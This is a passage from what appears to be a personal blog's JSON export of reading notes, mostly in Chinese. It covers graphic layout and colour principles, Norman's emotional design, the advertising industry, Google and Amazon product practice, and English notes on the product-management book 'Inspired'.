另外，当两个要素靠得很近时，我们就难以集中精力对其中一个要素进行单独的关注，此时使用远离，会减少干扰，更容易达到沉浸式体验； 排列、对齐：将细节部分设计得整齐有序，能够为版面带来整洁、有条不紊的感觉； 各处对齐； 同类元素保持相同的间隔； 确认元素安放于版心中； 视线的移动：编排要素的时候，要考虑通过设计让读者以怎样的顺序去阅读作品； 图片与文字：石头与流水的比喻； 构建&amp;重复：按照一定规则构成编排要素，可以使各类繁多的要素显得整齐；（例如给每条笔记添加项目顺序号） 多个页面时，如果每个页面使用相同的排版规则，会带来整体一致感； 要素有规律的排列会显得整齐划一，稍微无规律的排列会显得生动活泼，视设计意图而定； 直线和曲线的灵活应用：线条可以用来区分版面中的要素，也可以使相同类型的要素产生关联； 线条可以强调版本的固有规律，甚至在无规律的地方建立规律； 线条还可以引导视觉，增强元素之间的关联； 压线或压界的处理，会制造不拘一格的感觉； 粗线条和细线条会营造不同效果； 重心和平衡：构成版面的要素都有其“分量”，依据每个要素的分量进行设计，决定了版面的重心和平衡； 分量的大小是由其颜色和大小决定的；颜色可以通过设置为灰阶来判断； 一般将重心放在水平位置（因为相对于垂直方向，人眼更容易辨别出水平方向的重心） 字形、字体：文字的种类和它的组成构造； 明朝体（宋体）：古典优雅，类似英文衬线体；黑体：现代简洁，类似英文无衬线体； 磅值小的文字不适合用粗体，因为印刷的时候可能会糊掉； 中文混排的情况，可能需要放大英文的字号； 大段文字中的悬吊、避头尾的处理； 当要突出图片的时候，可以将文字缩小并置于边缘； 可以使用特殊字体来达到特殊设计的效果，但宜少而精，如标题，不宜在正文中大量使用，不然会影响阅读，让人厌烦； 易读的文字编排：尽量使文章容易阅读，是重要的课题之一； 先确定正文的磅值，之后才好确认标题、注释等的磅值； 不同阅读方式，如传单，由于拿在手中，可以凑近观看，所以文字适当缩小不会影响阅读； 通俗易懂的文章，适合快速阅读，则行宽可短，通过快速换行来提高节奏；如果是需要慢读的文章，则行宽应长，放慢节奏，有利于集中注意力； 需要仔细阅读的文字，则一般不分栏；如果是可以快速阅读的文字，如报纸，一般会分栏； 对于长文章，常用两端对齐，这样读者容易定位每行的头尾，从而控制阅读节奏； 正文行高一般设置为字号的两倍，但标题会少些，不然标题行距过大缺少整体感； 留白：文字间&lt;行间&lt;段落间&lt;栏间； 文字少图片多，有轻松感；文字多图片少，则更像严肃阅读； 通过小标题的粗，与正文字的细，产生明显的对比效果，有利于快速阅读的定位； 统一线宽：根据使用目的，选用合适的线条样式，并统一其宽度和形状； 文字也是一种线条，故线条宽度不宜超过文字，不然会影响阅读； 同一版面的线条种类不宜超过3种； 对称带来稳定感：好的对称给人带来稳定和谐的美感； 对称的设计，给人以均衡、协调、可靠、可依赖的感觉，如果产生想传达这种特质，则可以考虑对称式的设计（缺点是处理不好会有点单调）； 简单重复，给人予两个元素的平等独立感，但如果是全方面的对称（上下+左右），则可以产生互补整体感； 设定虚拟边框：排版前设定虚拟边框，之后将要素都转置于该虚拟边框中； 版面率高：可传达信息多，版面感觉热闹；版面率低：可传达信息少，版面感觉安静、素雅； 对于信息多或者页数多的作品，设定版心非常有必要； 装订边注意多留白； 天头地脚比例不同，传达效果不同；版心上移，会有创新、新鲜感；版心下移，则有稳重感； 页码等元素一般放在版心外； 网格的灵活应用：网格是提升页面条理性的好方法； 网格块数太少，如2*3，可能会降低灵活性； 完全形态法则：人会下意识的将多要素整理归纳为整体，或者从看到的事物中寻找图形的心理倾向，例如自动补全； Step 2 添加变化（白底粗边 尺缀体动） 建立条理后，通过添加变化，可以带来更新鲜和乐趣；（当然，要注意适度） 留白： 大的留白，给人奢华和高级感；小的留白则使人感到拥挤、热闹和欢快； 要素间小的留白使得要素产生关联性；要素旁大的留白，则突出要素的特殊性； 调整留白的同时，也要注意调整图像和文字的尺寸大小、色调差别等； 如果图片内有较大的单一空间，如大面积的天空，也可以做为留白来使用； 粗细度：改变文字或线条的粗细度，可以带来张弛感；（如果有多个同类要素使用这一方面，则会产生节奏感） 每个元素都会有分量，改变它们的分量，使其产生对比，就会带来变化； 尺寸：为要素的尺寸大小做变化，可以使版面生动有活力； 对要素的尺寸进行区分设置，差异越大则对比效果越显著，给人的印象也会越突出； 尺寸的大小比例称为“跳跃率”，跳跃率小的版面平稳安定，跳跃率大的版面则对比强烈，版面越活泼有朝气； 跃动感：加入动感的设计，可以更加引人注目； 使用动感的图片（若加以文字和线条的配合，效果会更加突出；注意同方向，不然会造成凌乱）； 人的视线和脸也会有方向性，可以加以利用； 打乱元素的排列对齐（但如果调整过度，会使得版面变得松散）； 改变水平线或基准线的角度，比如适当倾斜一定的角度； 使用手写体和不规则图形； 几条同一方面的线条集中起来，可以营造漫画般的飞入感； 注意保持文字方向的统一，以方便阅读； 退底：将图片裁成特定形状，可以带来更欢快的气氛； 角版：普通的四方形，有水平和垂直的方向感；如果将其倾斜摆放，或者变化尺寸，则会带来不一样的效果； 退底：去掉图片的背景，或者保留不规则或曲线的轮廓（不规则显得刚硬，曲线显得柔和）； 边界：配置要素较多的情况下，可以通过边界来增加一些变化（此时其他方法比较不好开展）； 增加隔线：水平线条使用多的话，会产生规则感和理智感；边框线条粗的话，会有沉重感； 带状线或面：通过面（线条+底色）可以增加区隔的同时带来变化； 点缀：通过在版面中加入视觉元素，来添加细微的变化； 上述的几点通过打乱条理是一类制作变化的方法，不打乱的话，则可以使用点缀的办法； 追加一点新的视觉元素，进而产生节奏感、动感和视线引导上的变化； 点缀由于分量较轻，适合重复使用；同时加入些微变化，避免了单调（比如尺寸、颜色）； 立体：将要素配置成立体感，也是一种添加变化的办法； 加阴影：注意阴影与图片中的光线方向一致； 黄金比例法则：10:16 白银法则：1：1.414（根号2）； 长宽比小于黄金比例，会产生更强的稳定感；大于黄金比例，则会产生纤细苗条感； Step 3 突出强调（明暗软硬 反射孤脸） 在做突出强调之前，首先要搞明白5W1H，以便知道哪些是需要强调，哪些不需要； 反差：可以通过加强反差，来强调特定要素； 明暗、尺寸、分量都是制造反差的办法； 在建立条理后，再对需要强调的要素进行反差强调，而不是建立条理之前； 明暗：最容易被感知到的反差（估计是因为人眼对光线非常敏感） 过于随意的使用黑白，会造成廉价和幼稚感（像是卡通漫画一样）； 如果画面中没有色彩，只有黑白，会容易显得空寂； 差异：在相同要素之间创造出差异 加框、加色、隔线、角度、留白、点缀、尺寸、形状等； 孤立：将需要强调的要素与其他要素远离 留白：做得足够大时，才能显示出效果（前提是版面空间允许）； 在使用孤立的方法前，先“理解”，以便确保要素适合使用孤立； 版面空间不够时，可以通过加底色代替留白来实现孤立； 放射：放射状的图形，会引导视觉进行关注； 中心编排、集中线、同心圆、箭头、指示符； 注意辅助的元素不要暄宾夺主； 软硬：刚硬要素和柔软要素互相搭配，也能带来显著效果； 直线、直角让人感觉刚硬；圆角和曲线让人感觉柔和； 渐变的阴影； 强烈鲜明的颜色感觉刚硬，明亮浅淡的颜色感觉柔和； 面孔：人和动物的面孔，都会吸引视线注意力； 小孩的脸部特征：脸圆、眼大 、鼻小、额宽； 如果整个人都进入画面，则会观身；如果只有眼部，则会观眼，并进而感知情感或情绪（与观身有很大区别）； 费茨法则：到达目标所需要的时间，正常应设计成越短越好； 大目标，短距离，更容易到达； 动作由两部分构成：弹道动作、引导动作（后者需要时间更长）； 大目标远距离，相对于小目标近距离，前者更不容易出错； Step 4 设计技巧（比质数，夸奏图，拟印事） 总述 在掌握了基本原则之外，再追求更深层次的目标，比如乐趣、美感、愉悦和创新等； 实现这些目标是有一些技巧的，通过积累大量的设计技巧，来更好的胜任工作； 看到好的作品的时候，要仔细揣摩作者的技巧，然后吸收为自己所用； 节奏：平面设计也可以创造出音乐般的节奏； 通过大小和角度的变化，让眼睛在追踪它们的时候，识别大小和角度的变化，从而在读者的潜意识里营造出跳跃的节奏；如果要素不适合改变角度，则可以考虑在背景中新增可以变化的要素； 尖角形要素可以营造打击乐般的短节奏； 曲线可以营造悠长柔美的节奏； 体现节奏的要素，要注意控制数量和它们之间的间距，太多会显得拥挤，缺少音乐般的空灵和回响； 比例：平面设计中可以创造各种不符合现实的比例，从而达到某种强调的效果； 可以在设计中创造逻辑反差，即现实中不存在的例子，如带翅膀的兔子，从而达到冲击力的效果； 改变物体的大小给人以冲击和乐趣；或者只改变图片中某一部分的比例也可（此时注意要素须是大家熟悉的事物，不然产生不了效果）； 数量感：要素的数量越多，会带来越强的视觉冲击力（但太多也会显得嘈杂，注意平衡） 当数量超过一眼扫视所能够数清的时候，大脑会反应出“多”的意识； 当要素多起来，由于版面面积受限，放置的数量有限，此时可以通过对要素添加大小变化来解决； 如果大量的要素是有规律的排列，则版面显得缺少动感和生气，此时可以适当改变部分要素的大小、角度或颜色，来添加变化； 夸张变形：越是司空见惯的东西，夸张变形越可带来特别的效果 夸张变形是改变物体正常的形状或比例； 比如头身比、拟人化、局部放大等； 尤其是放大脸部的时候，由于脸部会让人注意到表情和情感，所以效果特别明显； 质地感：引入质地要素可以带来密度感或高级感 质地感是物体表面的质感（或许可以理解为纹理）；由于加入纹理，产生了复杂性和层次感，视觉上无法一眼看穿它的规律，所以会感觉到高级和复杂，并可以比较持久的吸引视觉沉浸（如果读者愿意的话）； 有质地的背景容易吸引视觉注意力，影响氛围，所以应把握好平衡，以免喧宾夺主； 图案：可以让作品更显华丽； 不同的图案会影响读者不同的阅读心情，比如愉快或者沉重； 类比服饰搭配，素色与低纯度的颜色，较容易有统一感；如果使用大量高纯度的颜色，则难以有统一感，每一个颜色都争着说话；故不要使用过多各类的图案，仅在重点的部位进行点缀即可； 图案素材的积累可以提高创作的效率； 图案的颜色，与版面中其他要素的颜色，记得实现相搭配；如果图案的花纹存在感太强，则可以考虑将花纹缩小； 拟态：通过模拟熟悉的事物，带来亲近感，也更有容易信息的传达（相当于交互设计中的隐喻） 使用拟态也需要注意跟用户已经养成的认知习惯相统一，不然会适得其反，反而不利于信息的快速传达； 书与笔记本的案例； 由于产品与用户自我形象定位有关，所以有时候故意设计成区别于普通的产品，来达到突出高级感的自我形象定位； 印刷加工：纸张、油墨、裁切、印后加工 胶版纸：凹凸不平，不适合精细表现，但朴素柔和，手感舒适，适合拿在手中的场景； 铜版纸：光滑，色彩表现好，能够展现华丽的细节，适合海报等张贴的场景；（但也不一定，关键还是看设计的目的是想传达什么） 原色印刷：CMYK四色油墨；特种油墨，应对特别的颜色追求； 裁切：可以设定特殊形状； 装订：一般是机械化，但也可以设计成手工感； 追加故事情节：有故事的设计可以给人印象深刻 可以通过删减部分要素，引导读者发挥想象力，做加法进行补充；（想到了Leaf那幅图） 故事的要素有：时间、地点、人物、环境等；通过对其中任何一个要素进行删减或弱化，来达到突出其他故事主情节要素的效果；（环境比如光线）（让我想到了滤镜的使用） 爱德马法则 AIDMA：注意力，兴趣，欲望，记忆，行动；发布作品，吸引读者注意力，引起读者对所要表现的要素的兴趣，进而让其产生欲望（比如拥有），然后在其脑海中留下记忆，最后读者将记忆转化为行动； 一个好的作品，能够促使行动的产生，说明作品产生了很强的感染力（其实不仅平面设计，其他类型作品也适用这个原则，包括文章、音乐、视频等）； Step 5 颜色搭配 总述 颜色给人的印象，有很大的主观性，虽然有一定的规律，但又跟文化有很大的关系； 需要掌握颜色带给人的心理印象； 颜色的基本知识 色相：红、黄、绿、蓝、紫，以及由它们两两组合的颜色，包括红黄、黄绿、绿蓝、蓝紫、紫红； 纯度：纯度越高，则越鲜艳；越低，则越暗淡（越接近灰色）； 明度：越高则越接近白色，越低则越接近黑色； 视觉辨认性：明度的差异决定了颜色能否被看清楚； 如果图片处于中间色，即不论黑色或者白色都无法辨认清楚，则此时适合考虑使用蒙版； 色调和谐的配色 统一协调颜色的纯度和明度，可以使配色更加和谐； 书上列了12种色调，包括（粉淡色调，粉色调，鲜艳色调 ）；（浅灰色调，灰色调，深灰色调）；（浅色调，浊色调，暗色调）；（明亮色调， 高亮色调，深色调）；（很想了解它们各自的适用场景以及各自的颜色值）； 背景色面积最大，因此能够影响版面的氛围； 黑白两色一般可以跟所有色调互搭； 配色塑造形象 颜色具有形象，它来自于人所接触的一些日常事物或现象； 颜色给人的印象，可以分为冷、暖、软、硬四个维度（书中列了坐标轴，并给出了三色样例，很想知道这些样例的色调值）； 当版面中图片众多的时候，难以统一颜色风格，此时可以考虑通过在背景中加入颜色，来形成统一的印象氛围； 在大面积的颜色中，使用少量的重点色或效果色，来强调突出一些想突出的要素，形成点晴之笔； 强调色的用法 通过在配色的时候添加颜色之间差异，可以突显某些要素； 方法包括：色相对比、纯度对比、明度对比、补色对比、面积对比等；","categories":[{"name":"计算机","slug":"计算机","permalink":"http://example.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/"}],"tags":[{"name":"设计","slug":"设计","permalink":"http://example.com/tags/%E8%AE%BE%E8%AE%A1/"}]},{"title":"设计心理学3-情感设计","slug":"设计心理学3-情感设计","date":"2016-03-19T09:31:00.000Z","updated":"2024-09-22T23:08:43.587Z","comments":true,"path":"2016/03/19/设计心理学3-情感设计/","permalink":"http://example.com/2016/03/19/%E8%AE%BE%E8%AE%A1%E5%BF%83%E7%90%86%E5%AD%A63-%E6%83%85%E6%84%9F%E8%AE%BE%E8%AE%A1/","excerpt":"","text":"序言 设计的三个层次： 本能层次：产品的外观； 行为层次：使用的效率和愉悦感； 反思层次：自我形象，记忆，个人满足等关联； 认知负责诠释和理解周围的世界，情感则负责对此快速的做出判断；第一章：有吸引力的东西更好用 情感是行为产生的缘起； 放松-&gt;创造力，紧张-&gt;注意力； 基因决定了人的一些天性，它带有规律（我们可以通过了解规律，来辅助我们的本能层次的设计）； 第二章：情感的多面性与设计 产品做好细分更容易成功； 情感价值和艺术价值各得其所，很难说哪一个更高； 自我意识是人类的基本属性，因此产品与自我形象联系紧密（对于面向个人的产品，“想要”比“需要”更强烈地决定了产品的成败）； 产品的个性与其使用情境应相契合； 第三章：设计的三个层次：本能、行为、反思 先从本能层次的设计开始，让人感觉美和愉悦，可能它并不伟大，但这不要紧，首先，先考虑如何让它美，因为追求美是人类的本能； 行为层次：易于理解，易于使用，功能，感受（去了解用户如何使用产品，快速测试与迭代是实现的好办法）； 反思层次：满足情感需求，自我形象与社会地位； 第四章：乐趣与游戏 如何让产品产生乐趣？或许与喜剧的原理类似，比如反转即是其中的一种手法； 四个层面的愉悦：生理、心理、思想、社交； 以乐趣或愉悦为目的的设计； 禅的风景； 持久的愉悦感： 物品自身的多层次与复杂度； 欣赏者自身的欣赏能力； 音乐与声音：本能层次的反应； 电影：本能，代入，思考； 视频游戏：更强的代入（沉浸）以及参与控制感； 虚拟与现实或许会越来越融合； 第五章：人物、地点、事件 人对使用的物品也会产生移情； 人通过以下五项社交提示来推断他人：身体、心理、语言、机制、角色； 如果一个产品总是能够按照用户的预期进行工作，他们之间就会建立起信任感； 一项工作如果检查的人越多，则越容易出错，因为每个人都觉得他人会认真检查； 我们大量的使用即时聊天工具，并不是我们真的有多少严肃的思考或反思需要进行交流，而是因为我们寻找一种存在感和归属感； 永远在线的模式也会给我们的生活带来干扰，使我们难以集中注意力进行高效的工作，设计者应思考如何解决这个问题； 第六章：情感化机器 人会情感化外在的事物，这可能是一种天性，尤其是当这些物品能对我们的情感给出适当的反馈的时候，我们会更倾向于将其视为有情感的事物，并与其进行情感上面的互动； 第七章：机器人的未来 它将会变得更加智能，并改变我们未来的生活； 它的情感与伦理是我们将会面临并需要解决的问题； 人与机器的融合，或许是最有可能的结果； 后记：我们都是设计师 我们提供选项给客户定制，但却不能够建立情感，除非这一物品能够与其形象发生关联（此处我想到的案例是戴尔的电脑和一加的手机背壳，前者是隐性的定制，而后者是显性的）； 物品随着使用会与我们产生情感联系，尤其是当其优雅的老去，留下我们使用的印记时； 关于个性化与情感，可能是最好的方式是将工具交给用户（但对于工具类产品，此条估计并不成立，因为工具是达到目的的手段，我们正常不会花大多时间学习它）；","categories":[{"name":"计算机","slug":"计算机","permalink":"http://example.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/"}],"tags":[{"name":"设计","slug":"设计","permalink":"http://example.com/tags/%E8%AE%BE%E8%AE%A1/"}]},{"title":"广告","slug":"广告","date":"2016-03-17T01:55:00.000Z","updated":"2024-09-22T23:10:17.713Z","comments":true,"path":"2016/03/17/广告/","permalink":"http://example.com/2016/03/17/%E5%B9%BF%E5%91%8A/","excerpt":"","text":"广告行为做些什么 一种付费的交流活动，目的是提供信息，并且或者说服； 广告策划：界定目标，并确保让每个成员清楚目标是什么； 消费者（目标市场）想得到的： 信息和功能； 情感需求：例如展示自我形象； 广告企划人员：通过调研，定位目标，定位对象，寻找方案；（感觉有点类似产品经理） 广告业由哪几个部分构成 传统的三方架构：广告投放者，代理机构，媒体；后来衍化成四方，其中的代理机构细分为：创意代理，媒体代理；再后来，更是出现了庞然大物：市场营销集团，不止涵盖广告，而是全方位的营销方案； 以前的15%固定佣金制，使得广告投放者和媒体都拥有一定的话语权，所以做为广告代理，需要对两边负责；（感觉可能有点类似旅行社，对消费者和资源方负责）； 数码广告的出现（如互联网），使得广告投放者有了新选择；同时很多广告投放者成立专门的部门，来购买广告服务，并且他们倾向于向多个专业机构分别购买，并要求机构间通力合作，而不是由一家市场营销公司全权代理（作者认为这种方式并不能省钱）； 广告投放者：付钱的人 投放的目的：追求利润（短期或者长期）； 广告实效奖：评选那些成功的广告，实现了预期目标的广告，网址：warc.com（可以找到很多成功广告的案例，以及一些数据统计，如广告目标的多样性，平均预期目标数量）； 品牌建设是一种长远投资，与短期广告配合会使得营销活动进入良性循环； 品牌的4个特点：易辨识，有特色，功能+情感，可溢价；（也有少数企业不需要品牌建设，但比例很小） 媒体：为广告投放者说好话 判断媒体实效性的3个标准：目标人群覆盖率，性价比，影响力； 报刊与杂志31%，电视24%，互联网24%，电子邮件12%，户外及交通广告5%，电台3%，电影1%（未来会持续变化）； 千人成本：每接触1千名读者所需要的成本，注意，相同媒体形式才可以直接比较，因为不同媒体形式其效果不同； 互联网定位最精确，其次是电视，之后是行业目录或爱好者杂志； 相对于报纸，杂志有多个读者的现象，而且持续时间也较长，不像报纸的时效性那么短； 创意代理：发起新的广告宣传 两项核心职能：广告制作和媒体购买，也因此催生了两个职业，创意代理和媒体代理； 创意代理的工作要点： 确定必须传递的信息，以及语气； 重要的不是加入广告的讯息，重要的是目标人群获得的讯息（不同的人对相同的信息会有不同的解读）； 讯息包括：文字、图像、以及它们使用的方式； 创意代理一般是二人组，一个负责文案，一个负责视觉； 管理创意人员：通过引入广告企划人员，来给中间增加润滑剂； 客户管理：理解客户需求，维护客户关系，衔接内部其他部门； 国际性广告形为：随着经济全球化，广告的全球化也成为一种必然； 专业性代理：不同行业的特性不同，导致出现一些专业性的代理；同时，普通代理会受到行业竞业条款的限制，当然，他们可以将经验推广到其他更多的行业，这也是广告投放者内部难以形成有竞争力的代理机构的原因； 互联网的创意代理也有其特殊性，比如交互性内容，对隐私的关注等； 媒体代理：花费客户的资金 主要职责：企划（制定广告策略），购买（选择合适的媒体并购买）； 媒体购买的几个要素： 预算； 媒体的特质：通过各自突出声音、图像、文字等，来契合产品本身的特质； 目标市场的覆盖率； 规模、频率和时间安排； 互联网广告的分类： 展示广告； 搜索广告：特殊的收费方式–按点击量支付； 网站：类似于传统的目录、手册或传单； 调查，调查，调查 因为广告行为与最终结果之间的关系太过错综复杂，目前还没有一把万能的钥匙可以保证结果（随着时间推移，或许未来有可能）； 前期测试：在大规模宣传活动开始前，通过焦点小组或者深度访谈的形式来验证广告效果；样本选择目标人群非常重要，不然结论可能会误导； 追踪调查：通过设定一些指标，来验证是否达到预期的效果（技术手段越来越多，除常用的访谈外，还包括平面广告的眼球跟踪，记忆测试镜，汗量测试，脑部核磁共振成像等）； 好的，坏的，丑陋的 对于成熟的市场，广告很难增加市场容量，但可以用来打击竞争对手和影响市场的份额比例； 对于新兴的市场，广告有明显促进增长的作用； 广告的作用 促进了讯息的传达，让有价值的产品到达需要它的目标人群； 提高了销量，提供了就业，带来了税收，不管是对广告投放者，媒体，政府，还是广告业从业人员，都是如此；","categories":[{"name":"社科","slug":"社科","permalink":"http://example.com/categories/%E7%A4%BE%E7%A7%91/"}],"tags":[{"name":"销售","slug":"销售","permalink":"http://example.com/tags/%E9%94%80%E5%94%AE/"}]},{"title":"谷歌和亚马逊如何做产品","slug":"谷歌和亚马逊如何做产品","date":"2016-03-13T08:32:00.000Z","updated":"2024-09-22T23:08:43.594Z","comments":true,"path":"2016/03/13/谷歌和亚马逊如何做产品/","permalink":"http://example.com/2016/03/13/%E8%B0%B7%E6%AD%8C%E5%92%8C%E4%BA%9A%E9%A9%AC%E9%80%8A%E5%A6%82%E4%BD%95%E5%81%9A%E4%BA%A7%E5%93%81/","excerpt":"","text":"使命和策略 解决客户真正的问题； 让团队有使命感；（能够引起兴趣，可以印在T恤上，言之有物）； 策略：客户，问题，解决方案； 产品定义 FAQ累积形成帮助文档； 负载均衡与性能； 用户体验 走查清单： 用户在当前界面要完成的最重要的任务是什么？ 是否有更简单的解决方案？ 信息组织是否有序，显示出逻辑关系？ 各元素和组件是否易懂； 操作是否具备一致性？ 能否再减少用户的操作？ 项目管理 敏捷 测试 坚持TDD； 优秀的测试团队（作者推荐高标准的选择外包团队）； 亲自评审测试用例； 自动化测试； 坚定狗食； 找虫总动员； 量化 围绕产品目标制定量化指标； 改善这些指标，让产品沿正确方向上去完善； 发布 通过DEMO环境预发布并亲自从零开始试用，确保万无一失； 做好回滚的准备； 做好应急方案； 拒绝新增改动； 营造作战前的紧迫气氛； 团队 高招聘标准：比自己聪明，表述清晰，用数据说话，充满活力，明白职责与定位； 收购注意事项：注入自己的团队成员，改变文化；制定产品融合的计划；了解之前的交易与负债； 远程团队注意事项：充分沟通；不要外包PM和设计；注意文化差异；清晰需求；一起共饮； 加入新团队注意事项：不要批评，先了解历史； 技术 4S：服务器，服务，性能，扩展性； 询问正确的技术问题： 系统图； 方框间的时间延迟； 拓展性； 容错性（拿走一个方框会如何）； 缓存如何设计； 哪些模式考虑独立加载； 不要按照公司的组织架构来设计系统； 沟通 清爽的邮件，只陈述要点； 会议：简短，解决问题，收集信息，传递信息；五类会议：团队会议，1对1会议，评审会，站会，风暴会； 演示：控制在15分钟内；只传达一项信息；讲故事； 决策 最小功能版本：应对各种新增的需求； 谈判： 不要在立场上讨价还价； 注重共同利益； 为共同利益寻找多种解决方案； 坚持使用客观标准； 处理冲突： 避免说你和我两个字； 聚焦人物角色，而不是人； 坚持使用客观指标； 从容 平衡时间、质量、团队三者的关系； 分配好精力，只做最重要的事； 借力上司； 应对一些意外情况：打听清楚真实情况；更改表达方式；尽少发怒；请求通融；忍； 搞砸的时候，轻松面对，重新出发；","categories":[{"name":"计算机","slug":"计算机","permalink":"http://example.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/"}],"tags":[{"name":"产品","slug":"产品","permalink":"http://example.com/tags/%E4%BA%A7%E5%93%81/"}]},{"title":"Inspired-how to create products customer love","slug":"Inspired","date":"2016-02-03T06:44:00.000Z","updated":"2024-09-22T23:08:43.603Z","comments":true,"path":"2016/02/03/Inspired/","permalink":"http://example.com/2016/02/03/Inspired/","excerpt":"","text":"Introduction There are some examples on author’s web site, including prototype testing questions and tasks (www.svpg.com/examples), but I missed them before. I think I should browse the web site to study. Chapter 1: Key roles and responsibilities Product Manager assessing product opportunities; (ideas come from everywhere, product manager should take a hard look if it is worth pursuing) defining the product to be built; (including the key features and functionalities, user experience, and release criteria) (based on prototype and not papers, the key is to describe the functionality and the behavior of the product to be built) Project Manager scheduling and tracking; The ratios of roles; one interaction designer can support two product managers; one visual designer can support four interaction designer; one product manager supported by 5-10 engineers; Chapter 2: Product management vs. product marketing Three situations: marketing-driven product: in terms of defining the product, it is largely discounted and ignored; two people, one role: no one truly owns the product and then no one ultimately responsible; product manager become little more than spec generation service; one person, two roles: marketing means tells the world about the products, but product manager means defining the product, they are different, and it is rare to find someone has both skills; the way out; clearly define the distinct roles, one responsible for defining, one responsible for marketing; it doesn’t mean product marketing is not important, quite the opposite, it is very important, but just different from product defining job; Chapter 3: product management vs. project management For internet service company, it is important that the roles be separate; otherwise release will consistently be delayed, and take longer than they should; project management is all about executing to deliver the product, and product management is all about discovering a product that is valuable, usable, and feasible; Chapter 4: product management vs. design design roles includes: interaction design; visual design; rapid prototyping; usability testing; we also need a software architect make sure the prototype is feasible. More on this later; It is not recommended to outsource the interaction design, because it takes a long time to develop a deeper understanding about the target users, and the knowledge is easy to lost when the next release comes up. Most enterprise product is weak on interaction design, so create good user experience is the easiest way to differentiate the product from the competition. Chapter 5: product management vs. engineering three ways to come up with better product with engineers: get the engineers in front of users and customers; jump start this easily by inviting engineers along to prototype testing; sometimes they will come up better ideas and solutions too. enlist the help of engineers in exploring what’s becoming possible as technology develops; involve the engineers (or at least a lead engineer) or architect at the very beginning of product discovering process to get clearly assessment of relative costs of different ideas, or to help identify better solutions. three ways to help the engineers do their job: keep the focus on minimal product; once the engineer team begin to develop, do everything to minimize the churn; jump on their questions and get the answers as fast as possible; how to succeed with remote developers: use the high-fidelity prototype as the main communication mechanism; it is critical to have someone local to manage all the coordination with remote teams, to make the engineers know who is accountable; at least once a quarter the product manager should visit the engineer team to improve the relationship and communication; what about outsourcing do it not about cost savings, but for finding the right people. engineers want to re-write dedicate at least 20% to headroom, avoid slamming into ceilings; keep the product infrastructure able to meet the organization needs; Chapter 6: recruiting the product managers the personal traits and attitude of great product manager passion customer empathy: it is very important to empathize the target users. intelligence: it is job about insights and judgment, both of which require a sharp mind. integrity: he needs to earn the trust and respect of the team members. communication skills: he influence the others by persuasion rather than authority. skills; apply technology: it is a job to find new solution with new technology for existing old problems. focus: keep focus on the key problems, and ignore and even reduce those cluttering (unimportant) features. Chapter 11: accessing product opportunities ten fundamental questions to answer: Exactly what problem will this solve (value proposition); For whom do we solve this problem (target market); how big is the opportunity (market size); how will we measure success (metrics&#x2F;revenue strategy); what alternatives are out there (competitive landscape); why are we best suited for this (our differentiation); why now (market window); how will we get this product to market (go-to-market strategy); what factors are critical to success (solution requirements); given the above, what’s the recommendation (go or no-go); build new or fix old: it is the responsibility of the product team to access the profit and the costs, and it is the responsibility of the management team to ensure the company is pursuing the best opportunities available. Many times, the best opportunities are sitting right under the company’s nose. This is just another symptom of companies under-investing in design and user experiences. find a friend in the finance department, and try to answer below questions: do you understand the economics of your product? do you know your exact revenue model? do you know the total cost of your product? do you know how much you pay for the new customer? do you know their life time value to the company? do you know the return your product generated for the company? some information about the product can be uncovered from the financial staff, and expose fantastic opportunities. Chapter 12: product discovery defining the right product product opportunity assessment; interview the users and customers; understand the problem to be solved. work with interaction designer in prototyping; invite an engineer to evaluate the feasibility or cost of the prototype; test prototype with target users to ensure it’s valuable and usable. flesh out the details of use cases; review the prototype and spec with engineers; keep two versions of product going in parallel. One in execution, one in design for next release. Chapter 13: product principles decide what is important a set of principles to declare what you believe is more important. content: what problem are we going to solve; for whom will we solve this problem; why do we think it is important to do this; what objectives do we want to achieve; what is the priority of these objectives; be completely transparent about decision making process and reasoning, show everyone how you get there, not just following your intuition; Chapter 14: the product council timely and definitive product decisions a mechanism to get the stakeholders and decision makers together to make timely and informed product decisions; purpose to set the strategic product directions, allocate product resources and investments, and provide a level of oversight of the company product efforts; membership typically comprised of a cross-functional set of managers responsible for the product development; responsibility milestone 1: select the product opportunity to investigate; milestone 2: review product opportunity assessments and recommendations, issue go or no-go decisions to begin discovering a solution; milestone 3: review product prototype, user testing results, and detailed cost estimates, and issue go or no-go decisions to begin engineering; milestone 4: review final product, Q&#x2F;A status, launch plans, and community impact assessment, issue go or no-go to launch. Chapter 15: charter user program find at least 6 charter customer to make sure you are not producing custom product it would be great help for the sales job. they need to believe this is a real problem to solve and they need it solved as quickly as possible. the benefits to the customers&#x2F;users if they join: they can participate at the very beginning of product design, to make sure it solve the real problem. they can test the prototype to make sure the solution is working. they can use the product as early as possible once launched. if it is very hard to find charter customers, it is likely that we are not chasing a problem that is important. explain to the customers we are trying to come up with a general solution, and sell to a large number of customers, not a custom solution working only for them, otherwise we cannot build a real business, and we will go under and they would be left with unsupported, dead-end software. You need to be deeply committed come up with a product that works very well for them. Chapter 16: market research understanding the capabilities and limitations; site observation, user interview, focus group, brain storm, site analytic, customer survey, usability testing, field testing, data mining, personas, competitive analysis; all above techniques can help understand user’s needs, but still cannot come up with a good solution. Chapter 18: reinventing the product spec. it is strongly recommended to use prototype as the main product spec. the supplement is some document about business logic, flowchart, use cases, release criteria (reliability, performance, scalability ), platform delivery requirement (installation requirement, list of browsers version that supported). If possible, it is better to annotate this information on the prototype. Chapter 19: design vs implementation design the user experience before go to the engineering don’t do them in one sprint, the design should be one or two sprints ahead. only one exception is that there are a lot of infrastructure things to do, then they can proceed in parallel. Chapter 20: minimal product cutting features or slipping date do the cutting at the very beginning, that means the prototype must be minimal functionality. Then when it slip, you have nothing to cut, otherwise either the disabled dog don’t hunt, or the prototype is not the minimal. someone from the engineer team, like the architect or lead engineer, must participate in reviewing the prototyping to estimate the cost the prototype must be tested with the target users, to make sure they really want it. Chapter 21: product validation feasibility testing: to find out as early as possible if the product is buildable under time-frame; usability testing: to make sure the target user can easily figure out how to complete the task; valuable testing: to make sure the the target users care about the problem the product will solve, how well it solve, and do they want pay for it. Chapter 22: prototype testing finding the test subjects establish the charter user program; if it is a software for business, go to the trade shows; if it is a consumer software, use your friend and family network; in large company, it is better ask someone in charge of a testing session every two week, invite 10-20 persons come to the company to do test; go to the places where the users congregate, and make a road show; there is a high no-show rate, so it is better make a personal phone call one day before; prepare the test defining the task you’ll want to test; before show the subject the prototype, let them show you how they deal with the problem usually; before tell them the task, let them play the prototype freely for a few minutes, and then ask their for impressions and if they can figure out what problem the prototype can solve. questions to ask does he use a different product for the same 